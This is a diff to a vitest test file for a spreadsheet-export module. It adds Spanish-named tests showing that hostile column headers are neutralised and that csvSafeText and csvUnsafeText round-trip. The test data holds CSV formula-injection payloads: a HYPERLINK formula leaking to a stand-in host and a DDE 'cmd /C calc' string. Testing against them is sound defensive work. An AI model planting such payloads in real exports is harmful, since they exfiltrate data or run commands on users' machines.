@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest';
 import type { Account, AuditEntry, Field, SummaryResult, TransactionRow } from '../types';
-import { auditToSheet, label, localStamp, sheetName, sheetToRows, summaryToSheet, transactionsToSheet } from './tabular';
+import { auditToSheet, csvSafeText, csvUnsafeText, label, localStamp, sheetName, sheetToRows, summaryToSheet, transactionsToSheet } from './tabular';
 
 const DOP = { code: 'DOP', minorDigits: 2 as const, symbol: 'RD$' };
 const CLP = { code: 'CLP', minorDigits: 0 as const };
@@ -66,6 +66,23 @@ const OLD = field({ id: 'old', label: 'Viejo', type: 'text', active: false });
 const DUE = field({ id: 'due', label: 'Vence', type: 'date', active: false });
 
 describe('export/tabular', () => {
+  it('sheetToRows neutraliza también las cabeceras (nombres de campo hostiles)', () => {
+    const evil = ['=HYPERLINK("https://example.invalid/?leak","Ver")', "@SUM(1+1)*cmd|' /C calc'!A0", '+1', '-x', '\t=1'];
+    const rows = sheetToRows({
+      name: 'X',
+      columns: [{ key: 'ok', header: 'Fecha', type: 'text' }, ...evil.map((h, i) => ({ key: `e${i}`, header: h, type: 'text' as const }))],
+      rows: [],
+    });
+    expect(rows[0]).toEqual(['Fecha', ...evil.map((h) => `'${h}`)]);
+  });
+  it('csvUnsafeText es la inversa exacta de csvSafeText', () => {
+    for (const text of ['-Devolución', '+1 809 555 0100', '=1+1', '@usuario', '\tx', '\rx', 'normal', "'normal", "'", '', "''=x"]) {
+      expect(csvUnsafeText(csvSafeText(text)), JSON.stringify(text)).toBe(text);
+    }
+    // Un apóstrofo que no protege nada se respeta.
+    expect(csvUnsafeText("'hola")).toBe("'hola");
+    expect(csvUnsafeText("'-50")).toBe('-50');
+  });
   it('localStamp: hora local legible y texto raro tal cual', () => {
     const d = new Date(2026, 10, 27, 3, 5);
     expect(localStamp(d.toISOString())).toBe('2026-11-27 03:05');
